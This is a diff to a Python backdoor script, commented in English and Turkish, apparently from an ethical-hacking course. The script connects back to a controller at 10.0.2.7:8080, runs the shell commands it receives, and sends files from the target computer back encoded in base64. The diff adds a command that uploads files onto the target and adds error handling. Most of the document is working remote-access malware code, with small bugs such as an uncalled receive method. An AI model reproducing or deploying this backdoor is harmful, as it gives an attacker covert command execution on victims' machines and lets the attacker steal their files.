@@ -2,6 +2,8 @@ import socket
 import subprocess
 import json
 import os
+import base64
+import simplejson
 
 class MySocket:
     def __init__(self,ip,port):
@@ -10,15 +12,15 @@ class MySocket:
 
  #In order for the sent and received data to be understood and processed more properly, we write the following two functions in order to send the data with json packets.--Gönderilen ve alınan verilerin daha doğru anlaşılması ve işlenebilmesi için json paketleri ile veri göndermek için aşağıdaki iki işlevi yazıyoruz.
     def json_send(self, data):
-        json_data = json.dumps(data)
-        self.my_connection.send(json_data)
+        json_data = simplejson.dumps(data)
+        self.my_connection.send(json_data.encode("utf-8"))
     
     def json_receive(self):
         json_data = ""
         while True:#-We will ensure that the read files continue until they are finished.-Okunan dosyaların bitene kadar devam etmesini sağlayacağız.
             try:
-                json_data = json_data + self.my_connection.recv(1024)            
-                return json.loads(json_data) 
+                json_data = json_data + self.my_connection.recv(1024).decode()            
+                return simplejson.loads(json_data) 
             except ValueError:
                 continue
  #In order to change the directory in the backdoor application, we need to make the cd command available.--Arka kapı uygulamasında dizini değiştirmek için cd komutunu kullanılabilir hale getirmemiz gerekiyor.   
@@ -29,11 +31,16 @@ class MySocket:
     
     def get_file_content(self,path):
         with open(path, "rb") as myfile:#We find the file to be downloaded on the target computer, read it as binary and save it in a file named myfile.--Hedef bilgisayarda indirilecek dosyayı bulup ikili olarak okuyor ve myfile adlı bir dosyaya kaydediyoruz.
-            return myfile.read()
+            return base64.b64encode(myfile.read())#In order to download files with special characters (jpg), we get the files from the target computer in base64 format.--Özel karakter (jpg) içeren dosyaları indirmek için, dosyaları hedef bilgisayardan base64 formatında alıyoruz.
     
     def command_execution(self,command):
         return subprocess.check_output(command, shell = True)#We write a function that processes the incoming commands on our target computer.--Hedef bilgisayarımıza gelen komutları işleyen bir fonksiyon yazıyoruz.
-
+    
+    def save_file(self,path,content):          
+         with open(path, "wb") as my_file:
+             
+             my_file.write(base64.b64decode(content))
+             return "Download OK"
 
 
 #my_connection.send("Connection OK")#In order to test our connection, we first send a message to our host.--Bağlantımızı test etmek için önce ana makineye bir mesaj gönderiyoruz.
@@ -41,19 +48,26 @@ class MySocket:
     def start_backdoor(self):
         
     
-        while True:#To keep our connection continuous, we open a while true loop.--Bağlantımızı sürekli tutmak için bir süre gerçek döngü açıyoruz.
+        while True: #To keep our connection continuous, we open a while true loop.--Bağlantımızı sürekli tutmak için bir süre gerçek döngü açıyoruz.
             
-            command = self.json_receive#We create variables using the recv method and we can add commands from the host to this variable.--Recv metodu kullanarak değişkenler oluşturuyoruz ve ana bilgisayardan bu değişkene komutlar ekleyebiliyoruz.
-            if command[0] == "quit":
-                self.my_connection.close()
-                exit()
-            elif command[0] == "cd" and len(command)>1:
-                command_output = self.command_directory(command[1])
-            elif command[0] == "downloads":
-                command_output = self.get_file_content(command[1])
-                
-            else:
-                command_output = self.command_execution(command)#We assign an output of the command execution function to the variable.--Değişkene komut yürütme işlevinin bir çıktısını atarız.
+            command = self.json_receive #We create variables using the recv method and we can add commands from the host to this variable.--Recv metodu kullanarak değişkenler oluşturuyoruz ve ana bilgisayardan bu değişkene komutlar ekleyebiliyoruz.
+            
+            try:
+            
+                if command[0] == "quit":
+                    self.my_connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command)>1:
+                    command_output = self.command_directory(command[1])
+                elif command[0] == "downloads":#This conditional statement will work if you want to download the file.--Dosyayı indirmek istiyorsanız bu koşullu ifade çalışacaktır.
+                    command_output = self.get_file_content(command[1])
+                elif command[0] == "upload":
+                    command_output = self.save_file(command[1], command[2])
+                    
+                else:
+                    command_output = self.command_execution(command)#We assign an output of the command execution function to the variable.--Değişkene komut yürütme işlevinin bir çıktısını atarız.
+            except Exception:
+                 command_output = "Error"
             self.json.send(command_output)#We send the command output to the host computer with the send method.--Komut çıktısını, gönderme yöntemi ile ana bilgisayara gönderiyoruz.
         self.my_connection.close()
 socket_object=MySocket("10.0.2.7", 8080)
